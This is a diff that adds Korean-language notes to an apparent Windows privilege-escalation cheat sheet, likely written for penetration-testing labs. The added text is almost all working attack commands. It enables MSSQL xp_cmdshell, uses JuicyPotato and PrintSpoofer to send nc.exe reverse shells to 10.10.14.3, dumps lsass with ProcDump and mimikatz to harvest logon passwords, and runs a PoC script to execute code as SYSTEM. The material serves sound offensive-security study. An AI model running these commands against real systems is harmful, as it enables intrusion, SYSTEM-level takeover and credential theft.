@@ -166,6 +166,72 @@ PowerShell : ```Get-WmiObject -Class Win32_Product |  select Name, Version```
 - Impacket` 툴킷의 [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)
 ```mssqlclient.py sql_dev@10.129.43.30 -windows-auth```
 
+### xp_cmdshell 활성화
+```SQL> enable_xp_cmdshell```
+
+### 액세스 확인
+```SQL> xp_cmdshell whoami```
+
+### Account 권한 체크
+```xp_cmdshell whoami /priv```
+
+### JuicyPotato를 사용한 권한 상승
+- [JuicyPotato](https://github.com/ohpe/juicy-potato)는 `SeImpersonate` 또는 `SeAssignPrimaryToken` 권한을 악용하는 데 사용
+```xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *```
+
+### SYSTEM Shell 잡기
+```sudo nc -lnvp 8443```
+
+<br/><br/>
+## PrintSpoofer와 RoguePotato
+- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
+- [RoguePotato](https://github.com/antonioCoco/RoguePotato)
+
+### PrintSpoofer를 사용하여 권한 확대
+```xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"```
+
+### SYSTEM으로 Reverse Shell 잡기
+```nc -lnvp 8443```
+
+<br/><br/>
+# SeDebugPrivilege
+```
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== ========
+SeDebugPrivilege                          Debug programs                                                     Disabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
+```
+
+- [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)
+```procdump.exe -accepteula -ma lsass.exe lsass.dmp```
+```
+mimikatz.exe
+mimikatz # log
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonpasswords
+```
+
+<br/><br/>
+## SYSTEM으로서의 원격 코드 실행
+- SeDebugPrivilege for [RCE](https://decoder.cloud/2018/02/02/getting-system/)를 활용
+- [PoC script](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
+- [PoC 스크립트 업데이트](https://github.com/decoder-it/psgetsystem)
+
+```tasklist```<br/>
+```. .\psgetsys.ps1```<br/>
+```[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")```<br/>
+
+- [다른 도구](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
+
+>  참고 사이트 1 : https://steflan-security.com/windows-privilege-escalation-cheat-sheet/
+>  참고 사이트 2 : https://book.martiandefense.llc/notes/network-security/windows-privesc/windows-user-privileges 
+
 
 
 
